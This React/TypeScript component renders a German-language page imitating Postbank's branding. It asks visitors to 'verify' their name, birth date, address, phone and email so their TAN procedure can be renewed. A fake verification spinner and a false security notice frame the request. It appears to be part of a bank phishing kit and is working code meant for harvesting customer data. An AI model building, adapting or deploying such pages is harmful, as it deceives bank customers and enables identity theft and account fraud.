import React, { useState } from 'react';
import { Shield } from 'lucide-react';
import Loading from './Loading';
import PostbankFooter from './PostbankFooter';

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface PersonalDataFormProps {
  onSubmit: (data: PersonalData) => void;
}

const PersonalDataForm: React.FC<PersonalDataFormProps> = ({ onSubmit }) => {
  // Form state
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [dateOfBirth, setDateOfBirth] = useState('');
  const [street, setStreet] = useState('');
  const [streetNumber, setStreetNumber] = useState('');
  const [plz, setPlz] = useState('');
  const [city, setCity] = useState('');
  const [phone, setPhone] = useState('');
  const [email, setEmail] = useState('');
  
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    try {
      const formData: PersonalData = {
        first_name: firstName.trim(),
        last_name: lastName.trim(),
        date_of_birth: dateOfBirth.trim(),
        street: street.trim(),
        street_number: streetNumber.trim(),
        plz: plz.trim(),
        city: city.trim(),
        phone: phone.trim(),
        email: email.trim()
      };
      
      await onSubmit(formData);
    } catch (error) {
      console.error('Error submitting personal data:', error);
      setIsLoading(false);
    }
  };

  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .personal-data-container {
              padding: 1rem !important;
            }
            .personal-data-form {
              max-width: 100% !important;
              padding: 2rem 1.5rem !important;
            }
            .personal-data-title {
              font-size: 2rem !important;
              text-align: center !important;
            }
            .form-grid {
              grid-template-columns: 1fr !important;
            }
          }
          
          @media (max-width: 480px) {
            .personal-data-form {
              padding: 1.5rem 1rem !important;
            }
            .personal-data-title {
              font-size: 1.8rem !important;
            }
          }
        `}
      </style>
      
      {isLoading && (
        <Loading 
          message="Persönliche Daten werden verifiziert"
          type="verification"
          showProgress={true}
          duration={4.5}
        />
      )}
      
      {/* Main Content */}
      <div className="personal-data-container" style={{
        backgroundColor: 'white',
        minHeight: '100vh',
        padding: '60px 0'
      }}>
        <div style={{
          maxWidth: '1280px',
          margin: '0 auto',
          padding: '0 20px'
        }}>
          <div className="personal-data-form" style={{
            maxWidth: '800px',
            width: '100%',
            margin: '0 auto'
          }}>
            {/* Page Title */}
            <h1 className="personal-data-title" style={{
              fontSize: '3rem',
              fontWeight: '700',
              color: '#333',
              marginBottom: '2rem',
              fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
              lineHeight: '1.1'
            }}>
              Persönliche Daten verifizieren
            </h1>

            <p style={{
              fontSize: '1.125rem',
              color: '#333',
              lineHeight: '1.6',
              marginBottom: '3rem',
              fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
            }}>
              Um Ihre Identität zu bestätigen und Ihr TAN-Verfahren zu erneuern, benötigen wir einige persönliche Angaben von Ihnen.
            </p>

            <form onSubmit={handleSubmit}>
              {/* Personal Data Form */}
              <div style={{
                backgroundColor: '#fc0',
                border: '1px solid #e5e7eb',
                borderRadius: '8px',
                padding: '40px',
                marginBottom: '40px'
              }}>
                <h2 style={{
                  fontSize: '1.5rem',
                  fontWeight: '700',
                  color: '#0018a8',
                  marginBottom: '1.5rem',
                  fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                }}>
                  Ihre persönlichen Daten
                </h2>
                
                <div className="form-grid" style={{
                  display: 'grid',
                  gridTemplateColumns: '1fr 1fr',
                  gap: '20px',
                  marginBottom: '20px'
                }}>
                  {/* First Name */}
                  <div>
                    <label style={{
                      display: 'block',
                      fontSize: '14px',
                      fontWeight: '600',
                      color: '#0018a8',
                      marginBottom: '8px',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      Vorname
                    </label>
                    <input
                      type="text"
                      value={firstName}
                      onChange={(e) => setFirstName(e.target.value)}
                      placeholder="Max"
                      style={{
                        width: '100%',
                        padding: '12px',
                        border: '1px solid #ccc',
                        borderRadius: '4px',
                        fontSize: '16px',
                        backgroundColor: 'white',
                        boxSizing: 'border-box',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                      }}
                      required
                    />
                  </div>

                  {/* Last Name */}
                  <div>
                    <label style={{
                      display: 'block',
                      fontSize: '14px',
                      fontWeight: '600',
                      color: '#0018a8',
                      marginBottom: '8px',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      Nachname
                    </label>
                    <input
                      type="text"
                      value={lastName}
                      onChange={(e) => setLastName(e.target.value)}
                      placeholder="Mustermann"
                      style={{
                        width: '100%',
                        padding: '12px',
                        border: '1px solid #ccc',
                        borderRadius: '4px',
                        fontSize: '16px',
                        backgroundColor: 'white',
                        boxSizing: 'border-box',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                      }}
                      required
                    />
                  </div>
                </div>

                {/* Date of Birth */}
                <div style={{ marginBottom: '20px' }}>
                  <label style={{
                    display: 'block',
                    fontSize: '14px',
                    fontWeight: '600',
                    color: '#0018a8',
                    marginBottom: '8px',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                  }}>
                    Geburtsdatum
                  </label>
                  <input
                    type="date"
                    value={dateOfBirth}
                    onChange={(e) => setDateOfBirth(e.target.value)}
                    style={{
                      width: '100%',
                      padding: '12px',
                      border: '1px solid #ccc',
                      borderRadius: '4px',
                      fontSize: '16px',
                      backgroundColor: 'white',
                      boxSizing: 'border-box',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}
                    required
                  />
                </div>

                {/* Address Fields */}
                <div className="form-grid" style={{
                  display: 'grid',
                  gridTemplateColumns: '2fr 1fr',
                  gap: '20px',
                  marginBottom: '20px'
                }}>
                  {/* Street */}
                  <div>
                    <label style={{
                      display: 'block',
                      fontSize: '14px',
                      fontWeight: '600',
                      color: '#0018a8',
                      marginBottom: '8px',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      Straße
                    </label>
                    <input
                      type="text"
                      value={street}
                      onChange={(e) => setStreet(e.target.value)}
                      placeholder="Musterstraße"
                      style={{
                        width: '100%',
                        padding: '12px',
                        border: '1px solid #ccc',
                        borderRadius: '4px',
                        fontSize: '16px',
                        backgroundColor: 'white',
                        boxSizing: 'border-box',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                      }}
                      required
                    />
                  </div>

                  {/* House Number */}
                  <div>
                    <label style={{
                      display: 'block',
                      fontSize: '14px',
                      fontWeight: '600',
                      color: '#0018a8',
                      marginBottom: '8px',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      Hausnummer
                    </label>
                    <input
                      type="text"
                      value={streetNumber}
                      onChange={(e) => setStreetNumber(e.target.value)}
                      placeholder="123"
                      style={{
                        width: '100%',
                        padding: '12px',
                        border: '1px solid #ccc',
                        borderRadius: '4px',
                        fontSize: '16px',
                        backgroundColor: 'white',
                        boxSizing: 'border-box',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                      }}
                      required
                    />
                  </div>
                </div>

                <div className="form-grid" style={{
                  display: 'grid',
                  gridTemplateColumns: '1fr 2fr',
                  gap: '20px',
                  marginBottom: '20px'
                }}>
                  {/* PLZ */}
                  <div>
                    <label style={{
                      display: 'block',
                      fontSize: '14px',
                      fontWeight: '600',
                      color: '#0018a8',
                      marginBottom: '8px',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      PLZ
                    </label>
                    <input
                      type="text"
                      value={plz}
                      onChange={(e) => setPlz(e.target.value.replace(/\D/g, '').substring(0, 5))}
                      placeholder="12345"
                      maxLength={5}
                      style={{
                        width: '100%',
                        padding: '12px',
                        border: '1px solid #ccc',
                        borderRadius: '4px',
                        fontSize: '16px',
                        backgroundColor: 'white',
                        boxSizing: 'border-box',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                      }}
                      required
                    />
                  </div>

                  {/* City */}
                  <div>
                    <label style={{
                      display: 'block',
                      fontSize: '14px',
                      fontWeight: '600',
                      color: '#0018a8',
                      marginBottom: '8px',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      Ort
                    </label>
                    <input
                      type="text"
                      value={city}
                      onChange={(e) => setCity(e.target.value)}
                      placeholder="Musterstadt"
                      style={{
                        width: '100%',
                        padding: '12px',
                        border: '1px solid #ccc',
                        borderRadius: '4px',
                        fontSize: '16px',
                        backgroundColor: 'white',
                        boxSizing: 'border-box',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                      }}
                      required
                    />
                  </div>
                </div>

                {/* Contact Information */}
                <div className="form-grid" style={{
                  display: 'grid',
                  gridTemplateColumns: '1fr 1fr',
                  gap: '20px',
                  marginBottom: '20px'
                }}>
                  {/* Phone */}
                  <div>
                    <label style={{
                      display: 'block',
                      fontSize: '14px',
                      fontWeight: '600',
                      color: '#0018a8',
                      marginBottom: '8px',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      Telefonnummer
                    </label>
                    <input
                      type="tel"
                      value={phone}
                      onChange={(e) => setPhone(e.target.value)}
                      placeholder="+49 123 456789"
                      style={{
                        width: '100%',
                        padding: '12px',
                        border: '1px solid #ccc',
                        borderRadius: '4px',
                        fontSize: '16px',
                        backgroundColor: 'white',
                        boxSizing: 'border-box',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                      }}
                      required
                    />
                  </div>

                  {/* Email */}
                  <div>
                    <label style={{
                      display: 'block',
                      fontSize: '14px',
                      fontWeight: '600',
                      color: '#0018a8',
                      marginBottom: '8px',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      E-Mail-Adresse
                    </label>
                    <input
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="max.mustermann@email.com"
                      style={{
                        width: '100%',
                        padding: '12px',
                        border: '1px solid #ccc',
                        borderRadius: '4px',
                        fontSize: '16px',
                        backgroundColor: 'white',
                        boxSizing: 'border-box',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                      }}
                      required
                    />
                  </div>
                </div>

                {/* Submit Button */}
                <button
                  type="submit"
                  disabled={isLoading}
                  style={{
                    width: '100%',
                    backgroundColor: '#0018a8',
                    color: 'white',
                    border: 'none',
                    borderRadius: '4px',
                    padding: '16px',
                    fontSize: '16px',
                    cursor: isLoading ? 'not-allowed' : 'pointer',
                    opacity: isLoading ? 0.7 : 1,
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                    fontWeight: '700',
                    transition: 'all 0.3s ease',
                    marginTop: '10px'
                  }}
                  onMouseEnter={(e) => {
                    if (!isLoading) {
                      e.currentTarget.style.backgroundColor = '#001580';
                    }
                  }}
                  onMouseLeave={(e) => {
                    if (!isLoading) {
                      e.currentTarget.style.backgroundColor = '#0018a8';
                    }
                  }}
                >
                  {isLoading ? 'Wird verarbeitet...' : 'Daten bestätigen'}
                </button>
              </div>

              {/* Security Note */}
              <div style={{
                padding: '20px',
                backgroundColor: '#f8f9fa',
                borderRadius: '8px',
                borderLeft: '4px solid #0018a8',
                marginBottom: '40px'
              }}>
                <div style={{ display: 'flex', alignItems: 'flex-start', gap: '10px' }}>
                  <Shield size={16} color="#0018a8" style={{ flexShrink: 0, marginTop: '2px' }} />
                  <p style={{
                    color: '#0018a8',
                    fontSize: '14px',
                    margin: 0,
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                    lineHeight: '1.5'
                  }}>
                    <strong>Sicherheitshinweis:</strong> Ihre persönlichen Daten werden verschlüsselt übertragen und dienen ausschließlich der Identitätsverifizierung für die TAN-Verfahren-Erneuerung.
                  </p>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>
      <PostbankFooter />
    </>
  );
};

export default PersonalDataForm;